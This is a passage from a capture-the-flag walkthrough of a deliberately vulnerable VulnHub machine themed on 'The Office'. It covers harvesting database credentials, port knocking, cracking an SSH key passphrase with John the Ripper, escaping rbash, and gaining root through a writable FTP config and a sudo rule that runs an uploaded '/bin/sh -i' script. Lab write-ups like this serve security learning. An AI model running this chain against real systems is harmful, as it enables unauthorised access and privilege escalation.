uid=33(www-data) gid=33(www-data) groups=33(www-data)
$

Now we have code execution, and can work on finding the final flags, getting root, and stopping the doomsday machine.

## Accessing the MySQL database

There were 2 flags I needed some help to get, this flag and the final one. Thank you to this post: [https://nepcodex.com/2021/07/the-office-doomsday-device-walkthrough/](https://nepcodex.com/2021/07/the-office-doomsday-device-walkthrough/) for the help on these. Through looking at the users home directories, I had seen mysql history files but didn’t think anything of it at the time:

$ ls -al
total 48
drwxr-xr-x 5 dwight dwight 4096 Dec  3  2020 .
drwxr-xr-x 5 root   root   4096 Nov 16  2020 ..
-rw------- 1 dwight dwight 9615 Dec  3  2020 .bash\_history
-rw-r--r-- 1 dwight dwight  220 Apr  4  2018 .bash\_logout
-rw-r--r-- 1 dwight dwight 3771 Apr  4  2018 .bashrc
drwx------ 2 dwight dwight 4096 Nov 10  2020 .cache
drwx------ 3 dwight dwight 4096 Nov 10  2020 .gnupg
drwxrwxr-x 3 dwight dwight 4096 Dec  3  2020 .local
-rw------- 1 dwight dwight  586 Nov 30  2020 .mysql\_history
-rw-r--r-- 1 dwight dwight  807 Apr  4  2018 .profile
-rw-r--r-- 1 dwight dwight    0 Nov 10  2020 .sudo\_as\_admin\_successful
$ ls ../michael                 
script
sh
$ ls -al ../michael
total 188
drwxr-xr-x 6 michael michael   4096 Jan  5 17:21 .
drwxr-xr-x 5 root    root      4096 Nov 16  2020 ..
-rw------- 1 michael michael   2776 Jan  5 16:31 .bash\_history
-rw-r--r-- 1 michael michael    220 Nov 12  2020 .bash\_logout
-rw-r--r-- 1 michael michael   3771 Nov 12  2020 .bashrc
drwx------ 2 michael michael   4096 Nov 12  2020 .cache
drwx------ 3 michael michael   4096 Nov 12  2020 .gnupg
drwxrwxr-x 3 michael michael   4096 Nov 12  2020 .local
-rw------- 1 michael michael    166 Jan  5 17:18 .mysql\_history
-rw-r--r-- 1 michael michael    807 Nov 12  2020 .profile
drwx------ 2 michael michael   4096 Nov 13  2020 .ssh
-rw-r----- 1 michael michael     41 Nov 30  2020 .sus.txt
-rw------- 1 michael michael    847 Jan  5 17:21 .viminfo
-rw-r----- 1 michael michael  13120 Nov 17  2020 script

I was looking around for a while and didn’t get anywhere. After looking up the other walkthrough, I saw this was the correct way to go and was able to learn some new things on the route to getting the flag. The directory for where Koken is being hosted is at `/var/www/koken` . Looking around here, you are able to find a configuration sub directory. In here are some world readable files, including one about the database. Viewing that shows some new credentials that we can use to log into the database as Toby:

$ pwd
/var/www/koken/storage/configuration
$ ls -al
total 24
drwxr-xr-x  2 www-data www-data 4096 Nov 10  2020 .
drwxr-xr-x 11 www-data www-data 4096 Nov 10  2020 ..
-rw-r--r-- 1 www-data www-data  189 Nov 10  2020 database.php
-rwxr-xr-x  1 www-data www-data  114 Aug  7  2017 index.html
-rw-r--r-- 1 www-data www-data  207 Nov 10  2020 key.php
-rwxr-xr-x  1 www-data www-data  451 Aug  7  2017 user\_setup.php
<?php
        return array(
                'hostname' => 'localhost',
                'database' => 'kokendb',
                'username' => 'kokenuser',
                'password' => 'Toby!Flenderson444',
                'prefix' => 'koken\_',
                'socket' => ''
        );

Now that we have those new creds, we can log in and find the fifth flag. I also upgraded my shell to a TTY, but I don’t know if that as needed:

$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@doomsday:/$ mysql --user=kokenuser --password
mysql --user=kokenuser --password
Enter password: Toby!Flenderson444

Welcome to the MySQL monitor.  Commands end with ; or \\g.
Your MySQL connection id is 69
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.

mysql> show Databases;
show Databases;
+--------------------+
| Database           |
+--------------------+
| information\_schema |
| kokendb            |
+--------------------+
2 rows in set (0.00 sec)

mysql> use kokendb;
use kokendb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------------+
| Tables\_in\_kokendb             |
+-------------------------------+
| flag                          |
| koken\_albums                  |
| koken\_applications            |
| koken\_categories              |
| koken\_content                 |
| koken\_drafts                  |
| koken\_history                 |
| koken\_join\_albums\_categories  |
| koken\_join\_albums\_content     |
| koken\_join\_albums\_covers      |
| koken\_join\_albums\_tags        |
| koken\_join\_albums\_text        |
| koken\_join\_categories\_content |
| koken\_join\_categories\_text    |
| koken\_join\_content\_tags       |
| koken\_join\_tags\_text          |
| koken\_plugins                 |
| koken\_settings                |
| koken\_slugs                   |
| koken\_tags                    |
| koken\_text                    |
| koken\_trash                   |
| koken\_urls                    |
| koken\_users                   |
+-------------------------------+
24 rows in set (0.01 sec)

mysql> select \* from flag;
select \* from flag;
+----------------------------------------+
| record                                 |
+----------------------------------------+
| FLAG5:d2d1b5f66d0e00b35fe2bdee7ffcb398 |
+----------------------------------------+
1 row in set (0.00 sec)

mysql>

### FLAG5:d2d1b5f66d0e00b35fe2bdee7ffcb398

## Opening the SSH port

From the initial nmap scan, you can see port 22 is listed but shown as filtered. This usually means there’s a firewall or something else that is making it so there is no response back to nmap and it doesn’t know if it’s opened or closed. When I was looking around the machine, there was an interesting directory in one of the html directories:

www-data@doomsday:/var/www$ ls \*
ls \*
html:
\_hint\_  background.png  index.html  nick  robots.txt  staffblog

html2:
secret

koken:
a.php  admin  api.php  app  dl.php  i.php  index.php  preview.php  storage

I’ve figured out that the html directory corresponds is what’s being hosted on port 80. Checking it out, it’s three images and you need to find the difference:

www-data@doomsday:/var/www/html/\_hint\_$ ls
ls
index.html  knockknock1.jpg  knockknock2.jpg  knockknock3.jpg
www-data@doomsday:/var/www/html/\_hint\_$ curl http://10.0.2.7/\_hint\_/index.html
<html/\_hint\_$ curl http://10.0.2.7/\_hint\_/index.html
<!DOCTYPE html>
<html>
...trimmed...
<body>

<h2>Corporate needs you to find the difference between these pictures</h2>

<div class="row">
  <div class="column">
    <img src="knockknock1.jpg" alt="Snow" style="width:100%">
  </div>
  <div class="column">
    <img src="knockknock2.jpg" alt="Forest" style="width:100%">
  </div>
  <div class="column">
    <img src="knockknock3.jpg" alt="Mountains" style="width:100%">
  </div>
</div>

</body>
</html>

An easy way to find what image is different is to check the hashes and see which one doesn’t match up. After doing that, I downloaded the right file and investigated it:

www-data@doomsday:/var/www/html/\_hint\_$ md5sum \*
md5sum \*
3d3a8ae6b02b6de44488c77a950d99f3  index.html
87e88515fb8bbf9c3b9afba810ddf253  knockknock1.jpg
76319519515f5c801b2d1940ea2becb1  knockknock2.jpg
87e88515fb8bbf9c3b9afba810ddf253  knockknock3.jpg
--- back on my machine ---
~/Documents/vulnhub/doomsdayDevice » wget http://10.0.2.7/\_hint\_/knockknock2.jpg
--2022-01-06 13:37:25-- http://10.0.2.7/\_hint\_/knockknock2.jpg
Connecting to 10.0.2.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 93234 (91K) \[image/jpeg\]
Saving to: ‘knockknock2.jpg’

knockknock2.jpg               100%\[================================================>\]  91.05K  --.-KB/s    in 0.003s  

2022-01-06 13:37:25 (29.1 MB/s) - ‘knockknock2.jpg’ saved \[93234/93234\]

-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » exiftool knockknock2.jpg 
ExifTool Version Number         : 12.16
File Name                       : knockknock2.jpg
Directory                       : .
File Size                       : 91 KiB
File Modification Date/Time     : 2020:11:30 04:39:06-05:00
File Access Date/Time           : 2022:01:06 13:37:25-05:00
File Inode Change Date/Time     : 2022:01:06 13:37:25-05:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Copyright                       : #FLAG6: c9db6b7cad326cab2bcf0d2a26f7832d
Comment                         : Open sesame: 5000, 7000, 9000
Image Width                     : 741
Image Height                    : 743
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 741x743
Megapixels                      : 0.551

### FLAG6: c9db6b7cad326cab2bcf0d2a26f7832d

Now we have the sixth flag, and also have a hint toward unlocking the SSH port. The names of the images were called knockknock and the comment in the exif data said “Open sesame: 5000, 7000, 9000”. These two make me think of port knocking. This is basically a method of security through obscurity where a port isn’t opened unless some other ports are hit beforehand in the correct order. Trying the listed ports worked and opened the port:

~/Documents/vulnhub/doomsdayDevice » nmap -p22 10.0.2.7
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-06 13:46 EST
Nmap scan report for 10.0.2.7
Host is up (0.0014s latency).

PORT   STATE    SERVICE
22/tcp filtered ssh

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » knock 10.0.2.7 5000 7000 9000              
-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » nmap -p22 10.0.2.7           
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-06 13:46 EST
Nmap scan report for 10.0.2.7
Host is up (0.00058s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds

## Getting SSH access

Now that SSH is up, I tried to connect as Michael using the key we found earlier. Unfortunately, it did not go as planned:

~/Documents/vulnhub/doomsdayDevice » ssh -i michael michael@10.0.2.7                                             
\_\_\_\_\_\_                 \_            \_\_\_  \_\_\_\_  \_\_  \_\_ \_ \_       
|  \_  \\               | |           |  \\/  (\_)/ \_|/ \_| (\_)      
| | | |\_   \_ \_ \_\_   \_\_| | \_\_\_ \_ \_\_  | .  . |\_| |\_| |\_| |\_ \_ \_\_  
| | | | | | | '\_ \\ / \_\` |/ \_ \\ '\_\_| | |\\/| | |  \_|  \_| | | '\_ \\ 
| |/ /| |\_| | | | | (\_| |  \_\_/ |    | |  | | | | | | | | | | | |
|\_\_\_/  \\\_\_,\_|\_| |\_|\\\_\_,\_|\\\_\_\_|\_|    \\\_|  |\_/\_|\_| |\_| |\_|\_|\_| |\_|
Enter passphrase for key 'michael': 
Enter passphrase for key 'michael': 
Enter passphrase for key 'michael': 
michael@10.0.2.7: Permission denied (publickey).

We have the private key, but it needs a password. We can try and crack this to get access:

~/Documents/vulnhub/doomsdayDevice » sudo python /opt/ssh2john.py michael                                          1 ↵
michael:$sshng$1$16$CF1CA7F9558B5637B0C9F66B972B6AB6$1200$1a502dd94862fb304e3211ab01247489c6b561393b05304dcca024a8b1b3c93cb57a99442a24e8bbb2dd5b9855eca85f654fbd5fd0a0e4bf4a1d3fb0d0e150795821cd83b067e69ecb3a228b55a8fe9171e3ad1e523e68153267b0dfd4bc77e2b23197f1b2e9e114fe1e34d9afb6f6f97883c30df7c5db247675de1c173d0ac0d103ee7dc7cf9bb33b68f97df36885452da2789c8c769d356d9fd0ca108b5f9ac2f78829f804a293d6443de0af11dc2c75d4775be3d6ee0724587080898684fa8f8d7a2ca3549c7f45e7774bc87ad8e95a318eb724656402d390e188d82f6ba4f106aa17f1730455635ff54068aac6e5318558e69da76ef33abbaa725625fa852a8b2f131ef64732bd8782e758ab0125c8946656e9f40489e19eb119b8b8a1b81de16d4f9ed35e1ed7223aac72ab11fecc05305f4519146ba347c20d3cdadeafa52ab986592413eb3338178887d283aee8af1ca5ed8905f0504c72171b5dfa5eee0817fe055735c57cfe01f76d1e7304e345dc6978264829c22daa9e9d439d1f1e899a045af40646bf51fc890030da0c9d680bbf15820df5cba410c10b1f2a988bd060d8c26098144936fd6045f2ec9f6704e1d029f251c2325f1bfdf7a64b7d7f5149172b29784c8f0d982f3e3770fe5b93052b059d7f3a79c2b31cda656057afe35911690521f1466ade915a6ade815c11e7ca10838b34edf20837e54559374297d1c616530606ba54ae5cb93c8cc5e61108c438ae2fa2c4716e64318c2dacf0a8e102befbe2a2932481a4d695c6e634172d44d3b00ac8597eec332ef36787848dbd3b879b3b4275e63c485fc4daf5d5c2b29a8a6d878be91301ebfb9911deb570fd8c87429df0aeeb52e09dc8e205ed15c5eb5c219e1cb8601ed49be3b7893001423b11d93d3e20ac5ab1812b8ae40d32ba8cc2d4173c87f127fc0071588098b2a1fc7a025027e80bcfa4b16c32718b8475ed3a3b1447f739f41c84ede6982cfa0b64060186db9c5251b13dac630289019dff00c871a774b634fd5a7c6848fbe56111d258bcb92a3c8619285645c5db30ce258596ef1c792dafaa43df9ae75cc59db0b4ca9f9c6bd080c5fa204da5dfdc50a18ed568b84e366465fe9a4d9642cee9ab7f7fc0d591faa5fdf6bd1760f5f0387841e0c309ffa8b251628df79a3f7afa005d46579805a231526c66e156c9f2a903d24b613c8df62f3bd580a38cf2ad89d5c0bba493790553359e630fc73dbd314657bdfe1153be69f5f135941697ff9681a7e27b1d41d110183472877ae8d1c9faefd680686b5062138b657ee122fb5e2e45d6283682803c10be4c6259efe2d537f418a1c3a00e7ea986cdaf47710afdbec175af2157a800fb231c238d36207135b1123d8ffcb073782eab7cbce03deba53e43c75416a2076973206101b84c4edc28c5f5ca99311c91a3c5e13a6ad9c39bc4d9e3b8deeaa95852306f83d4a06dee55c28456aa6e67a6d260fbc82f9f67c3438dbfed46e2de011bf5921c6281ab585ca4ea4d20518048547c79555c8692bd3ad313c06bd2a7f33b762451fc48d22c585c0612a08c89c21e0c919d06b95f707acfdfc7206930747dfcd42b97979318c4302ddd2dc8bc9ea9ae8973d25a673793c3e301c70ddbd54a7b5d579c38add252756695707a212cb8ff7a562f3e48e8afc30046a78b6adc9850bdb2
-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » sudo python /opt/ssh2john.py michael > michaelHash
-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » john -wordlist:/usr/share/wordlists/rockyou.txt michaelHash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH \[RSA/DSA/EC/OPENSSH (SSH private keys) 32/64\])
Cost 1 (KDF/cipher \[0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES\]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
mypassword1234   (michael)
1g 0:00:00:04 82.88% (ETA: 18:35:03) 0.2197g/s 2612Kp/s 2612Kc/s 2612KC/s 7573364..7573136
Session aborted

Luckily Michael has a bad password and it is found in rockyou. Now that we have the password, we can log in with SSH and get the seventh flag:

~/Documents/vulnhub/doomsdayDevice » ssh -i michael michael@10.0.2.7                                                  
\_\_\_\_\_\_                 \_            \_\_\_  \_\_\_\_  \_\_  \_\_ \_ \_                                                             
|  \_  \\               | |           |  \\/  (\_)/ \_|/ \_| (\_)                                                            
| | | |\_   \_ \_ \_\_   \_\_| | \_\_\_ \_ \_\_  | .  . |\_| |\_| |\_| |\_ \_ \_\_                                                        
| | | | | | | '\_ \\ / \_\` |/ \_ \\ '\_\_| | |\\/| | |  \_|  \_| | | '\_ \\                                                       
| |/ /| |\_| | | | | (\_| |  \_\_/ |    | |  | | | | | | | | | | | |                                                      
|\_\_\_/  \\\_\_,\_|\_| |\_|\\\_\_,\_|\\\_\_\_|\_|    \\\_|  |\_/\_|\_| |\_| |\_|\_|\_| |\_|                                                      
Enter passphrase for key 'michael':                                                                                   
michael@doomsday:~$ ls -al                                                                                            
total 60                                                                                                              
drwxr-xr-x 6 michael michael  4096 Nov 30  2020 .                                                                     
drwxr-xr-x 5 root    root     4096 Nov 16  2020 ..                                                                    
-rw------- 1 michael michael  2776 Jan  5 16:31 .bash\_history                                                         
-rw-r--r-- 1 michael michael   220 Nov 12  2020 .bash\_logout                                                          
-rw-r--r-- 1 michael michael  3771 Nov 12  2020 .bashrc                                                               
drwx------ 2 michael michael  4096 Nov 12  2020 .cache                                                                
drwx------ 3 michael michael  4096 Nov 12  2020 .gnupg                                                                
drwxrwxr-x 3 michael michael  4096 Nov 12  2020 .local                                                                
-rw-r--r-- 1 michael michael   807 Nov 12  2020 .profile                                                              
-rw-r----- 1 michael michael 13120 Nov 17  2020 script                                                                
drwx------ 2 michael michael  4096 Nov 13  2020 .ssh                                                                  
-rw-r----- 1 michael michael    41 Nov 30  2020 .sus.txt                                                              
michael@doomsday:~$ cat .sus.txt                                                                                      
#FLAG7: 76a2ecd19b04acb89b7fe8c3d83296df

### FLAG7: 76a2ecd19b04acb89b7fe8c3d83296df

## Escaping rbash

Pretty quickly, you’ll see you’re stuck in rbash:

michael@doomsday:~$ /etc
-rbash: /etc: restricted: cannot specify \`/' in command names

This limits a lot of what we can do, and to progress you need to escape it. I figured out I could copy files, and used this to get out:

michael@doomsday:~$ cp /bin/bash .
michael@doomsday:~$ ls
bash  script  sh
michael@doomsday:~$ ./bash
-rbash: ./bash: restricted: cannot specify \`/' in command names
michael@doomsday:~$ bash
michael@doomsday:~$ cd /etc
michael@doomsday:/etc$

The shell looks the same, but using the same command that failed last time shows that we are out. Also, reading the other walkthrough showed that the way I upgraded my TTY previously would have worked as well. For some reason I thought it wouldn’t, but that’s good to know:

michael@doomsday:~$ cd /etc
-rbash: cd: restricted
michael@doomsday:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
michael@doomsday:~$ cd /etc
michael@doomsday:/etc$

## Getting root

The first thing I checked after escaping rbash was checking what Michael could run as root:

michael@doomsday:~$ sudo -l
Matching Defaults entries for michael on doomsday:
    env\_reset, mail\_badpass,
    secure\_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User michael may run the following commands on doomsday:
    (ALL) NOPASSWD: /home/creed/defuse\*
michael@doomsday:~$ ls -al /home
total 20
drwxr-xr-x  5 root    root    4096 Nov 16  2020 .
drwxr-xr-x 24 root    root    4096 Nov 12  2020 ..
drwxr-xr-x  4 creed   creed   4096 Jan  5 17:30 creed
drwxr-xr-x  5 dwight  dwight  4096 Dec  3  2020 dwight
drwxr-xr-x  6 michael michael 4096 Jan  6 19:05 michael

He can run any file in Creed’s home directory that starts with defuse. We can’t write to it, but then I remembered we can FTP in as Creed and upload files! All we should have to do upload a program to spawn an interactive shell and the challenge would be done. Unfortunately, it wasn’t quite that easy:

~/Documents/vulnhub/doomsdayDevice » cat defuse.sh 
#!/bin/bash

/bin/sh -i
----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » ftp 10.0.2.7
Connected to 10.0.2.7.
220 (vsFTPd 3.0.3)
Name (10.0.2.7:connor): creed
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put defuse.sh
local: defuse.sh remote: defuse.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
24 bytes sent in 0.00 secs (378.0242 kB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r-- 1 0        0            2026 Nov 12  2020 archive.zip
-rw------- 1 1001     1001           24 Jan 05 17:30 defuse.sh
-rw-r--r-- 1 0        0             176 Nov 30  2020 reminder.txt

Anything that was uploaded to the directory was not executable, which wouldn’t work for me because I couldn’t use the Michael to change any permissions in that directory. FTP does have a `chmod` command, but it wouldn’t work on this server. I looked around for an hour or so and tried a couple of other things, but nothing worked. This was when I went back to the other walkthrough and saw what I was missing.

The next step was involving the chmod command in FTP. It was disabled on this host, like I found, but I missed that the config file was writeable to anyone. The file is stored at `/etc/vsftpd.conf` and all I had to do was edit the `chmod_enable` field:

pasv\_min\_port=40000
pasv\_max\_port=40100
chmod\_enable=YES

Now the last step was restarting the machine, and this change would be applied. After it was back on, I reknocked on the ports and then was able to use FTP to change the permissions:

ftp> chmod 777 defuse.sh
200 SITE CHMOD command ok.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r-- 1 0        0            2026 Nov 12  2020 archive.zip
-rwxrwxrwx    1 1001     1001           24 Jan 05 16:58 defuse.sh
-rw-r--r-- 1 0        0             176 Nov 30  2020 reminder.txt
226 Directory send OK.
ftp>

Now that the file can be run, I logged in as Michael again and got root:

~/Documents/vulnhub/doomsdayDevice » ssh -i michael michael@10.0.2.7                                                  
\_\_\_\_\_\_                 \_            \_\_\_  \_\_\_\_  \_\_  \_\_ \_ \_                                                             
|  \_  \\               | |           |  \\/  (\_)/ \_|/ \_| (\_)       
| | | |\_   \_ \_ \_\_   \_\_| | \_\_\_ \_ \_\_  | .  . |\_| |\_| |\_| |\_ \_ \_\_  
| | | | | | | '\_ \\ / \_\` |/ \_ \\ '\_\_| | |\\/| | |  \_|  \_| | | '\_ \\ 
| |/ /| |\_| | | | | (\_| |  \_\_/ |    | |  | | | | | | | | | | | |
|\_\_\_/  \\\_\_,\_|\_| |\_|\\\_\_,\_|\\\_\_\_|\_|    \\\_|  |\_/\_|\_| |\_| |\_|\_|\_| |\_|
Enter passphrase for key 'michael': 
michael@doomsday:~$ python3 -c "import pty; pty.spawn('/bin/bash')"
michael@doomsday:~$ /home/creed/defuse.sh                   
$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael)
$ exit
michael@doomsday:~$ sudo /home/creed/defuse.sh
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/michael
# cd /root
# ls
flag.txt
# cat flag.txt
IDENTITY THEFT IS NOT A JOKE! Millions of families suffer every year.
But anyways. You beat me. You are the superior being.

Dwight Schrute
Assistant Regional Manager

#FLAG8: ebadbecff2429a90287e1ed98960e3f6

  \_\_\_\_\_                  \_             \_\_  \_\_ \_  \_\_  \_\_ \_ \_       
 |  \_\_ \\                | |           |  \\/  (\_)/ \_|/ \_| (\_)      
 | |  | |\_   \_ \_ \_\_   \_\_| | \_\_\_ \_ \_\_  | \\  / |\_| |\_| |\_| |\_ \_ \_\_  
 | |  | | | | | '\_ \\ / \_\` |/ \_ \\ '\_\_| | |\\/| | |  \_|  \_| | | '\_ \\ 
 | |\_\_| | |\_| | | | | (\_| |  \_\_/ |    | |  | | | | | | | | | | | |
 |\_\_\_\_\_/ \\\_\_,\_|\_| |\_|\\\_\_,\_|\\\_\_\_|\_|    |\_|  |\_|\_|\_| |\_| |\_|\_|\_| |\_|

#

### FLAG8: ebadbecff2429a90287e1ed98960e3f6

I really enjoyed this machine and would definitely recommend it. It has a lot of the humor of the show and also includes a lot of cool callbacks. I learned a couple new things, especially not to overlook writeable/readable config files, as those were the culprit both times I got stuck. I’m not sure what the next machine I’ll work on is, but I will not forget that then.
